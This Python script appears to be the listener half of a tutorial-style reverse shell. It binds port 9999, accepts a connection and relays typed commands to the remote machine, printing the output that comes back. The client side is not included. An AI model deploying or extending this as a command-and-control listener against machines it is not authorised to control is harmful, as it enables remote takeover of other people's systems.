#!/usr/bin/env python3
import socket
import sys
import subprocess
import os

print("Current Working Directory: {}".format(os.getcwd()))
print("Python Version: {}".format(sys.version))
# x= subprocess.Popen(['ipconfig'], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)


def create_server():
    """
    Create a socket to establish communication between two computers
    :return:
    """
    try:
        global host
        global port
        global my_socket
        host = ""  # Empty because we will be hosting it on our server
        port = 9999
        my_socket = socket.socket()
        print("Socket Connection Created!!")
    except socket.error as err:
        print("Socket Creation Failed for the reason : {}".format(str(err)))


def bind_the_socket():
    try:
        global host
        global port
        global my_socket
        print("Binding socket to the port: {}".format(port))
        my_socket.bind((host, port))
        my_socket.listen(5)  # Server should be listening continuously for connections.
        # 5: Number of bad connections it is going to tolerate after which it will throw an error
    except socket.error as err:
        print("Socket Binding Failed because : {}".format(str(err)))
        print("Retrying...")
        bind_the_socket()  # Persistent binding if it fails for some reason


def accept_connections():
    connection, address = my_socket.accept()
    print("Connection has been established! |  IP: {}  |  Port: {}".format(address[0], str(address)))
    send_command(connection)
    connection.close()


def send_command(connection):
    while 1:
        cmd = input()
        if cmd == 'quit':
            connection.close()
            my_socket.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:  # When you send data, you have to send it as bytes and not string
            connection.send(str.encode(cmd))  # Encode cmd to bytes
            response = str(connection.recv(1024), 'utf-8')  # Utf to convert bytes to str. 1024 is receiving in Chunks
            print(response, end="")  # end makes it come to the next line to execute next command
            # else it all comes in one line making it meaningless


if __name__ == '__main__':
    create_server()
    bind_the_socket()
    accept_connections()
